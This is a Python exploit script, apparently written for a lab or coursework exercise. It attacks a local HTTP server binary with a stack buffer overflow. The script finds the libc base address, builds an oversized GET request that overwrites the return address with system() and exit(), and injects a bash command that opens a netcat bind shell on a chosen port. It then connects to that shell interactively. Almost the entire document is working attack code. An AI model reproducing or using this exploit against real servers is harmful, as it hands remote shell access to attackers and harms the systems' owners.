#!/usr/bin/env python

from struct import pack
from console import console
import subprocess
import sys
import socket
import time
import os

if len(sys.argv) != 3:
    sys.exit("Usage: %s PORT LISTEN_PORT" % sys.argv[0])


port = int(sys.argv[1])
sock = socket.create_connection(('127.0.0.1', port),
                                socket.getdefaulttimeout(),
                                ('127.0.0.1', 0))

base = int(subprocess.check_output(r"setarch i686 -R bash -c 'LD_TRACE_LOADED_OBJECTS=1 webroot/server'|sed -ne '/libc/ s/.*(\(.*\))/\1/p'", shell=True), 16)
	
exit_addr = base + 0x000337b0
system_addr = base + 0x00041080		

cmd = "GET /index.html "
p = ""
	
for x in range(0, 115):
	p += "a"
	
p += pack('<I', 0xffffdb38) # overwritten ebp	
p += pack('<I', system_addr) # system
p += pack('<I', exit_addr) # exit (called after system)
p += pack('<I', 0xffffcd60) # pointer to string argument preceeded by spaces
p += pack('<I', 0x0804c788) # pointer to anything on seg
p += pack('<I', 0xffffc9ac) # pointer to 505 on stack

for x in range(0, 800):
	p += " "
	
#p += "bash -c 'echo grrrr' #"

p += "bash -c 'coproc p { /bin/bash 2>&1; }; nc -l 127.0.0.1 "
p += sys.argv[2]
p += " <&${p[0]} >&${p[1]}' #"
	
p += "\r\n\r\n"
	
cmd += p 
	
sock.sendall(cmd)	
sock.close()

time.sleep(2)

port = int(sys.argv[2])
sock_bind = socket.create_connection(('127.0.0.1', port),
                                     socket.getdefaulttimeout(),
                                     ('127.0.0.1', 0))
console(sock_bind)
	
while True:
    	buf = sock_bind.recv(4096)
    	sys.stdout.flush()
	if not buf:
		break
